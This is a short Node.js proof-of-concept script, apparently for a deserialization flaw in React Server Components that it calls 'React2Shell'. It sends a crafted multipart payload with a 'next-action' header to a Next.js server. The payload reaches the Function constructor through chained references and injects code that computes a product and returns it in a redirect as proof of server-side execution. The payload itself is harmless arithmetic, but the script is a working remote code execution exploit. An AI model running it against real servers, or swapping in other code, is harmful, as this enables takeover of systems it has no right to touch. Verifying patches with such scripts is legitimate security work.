import assert from 'node:assert/strict';
import { randomInt } from 'node:crypto';
const base = process.env.RSC_URL || 'http://127.0.0.1:3001';
const a = randomInt(1000,9999), b = randomInt(1000,9999);
// Arithmetic is evaluated only inside the server-side decoder. The expected
// product is not sent as literal input, preventing mere reflection from passing.
const marker = `/zazzles-rsc-${a*b}`;
const prefix = `throw Object.assign(new Error('NEXT_REDIRECT'), {digest:'NEXT_REDIRECT;replace;/zazzles-rsc-'+(${a}*${b})+';303;'});//`;
const payload = {
  '0': '$1',
  '1': { status:'resolved_model', reason:0, _response:'$4', value:'{"then":"$3:map","0":{"then":"$B3"},"length":1}', then:'$2:then' },
  '2': '$@3', '3': [],
  '4': { _prefix:prefix, _formData:{get:'$3:constructor:constructor'}, _chunks:'$2:_response:_chunks' },
};
const form = new FormData();
for (const [key,value] of Object.entries(payload)) form.append(key,JSON.stringify(value));
const response=await fetch(base,{method:'POST',headers:{'next-action':'x'},body:form,redirect:'manual',signal:AbortSignal.timeout(30000)});
const body=await response.text();
const evidence=[...response.headers.values()].join('\n')+'\n'+body;
assert.ok(evidence.includes(marker), `No execution marker found (HTTP ${response.status}). Check target version, App Router, and server logs.`);
console.log(`PASS: React2Shell server-side arithmetic execution demonstrated (${marker})`);
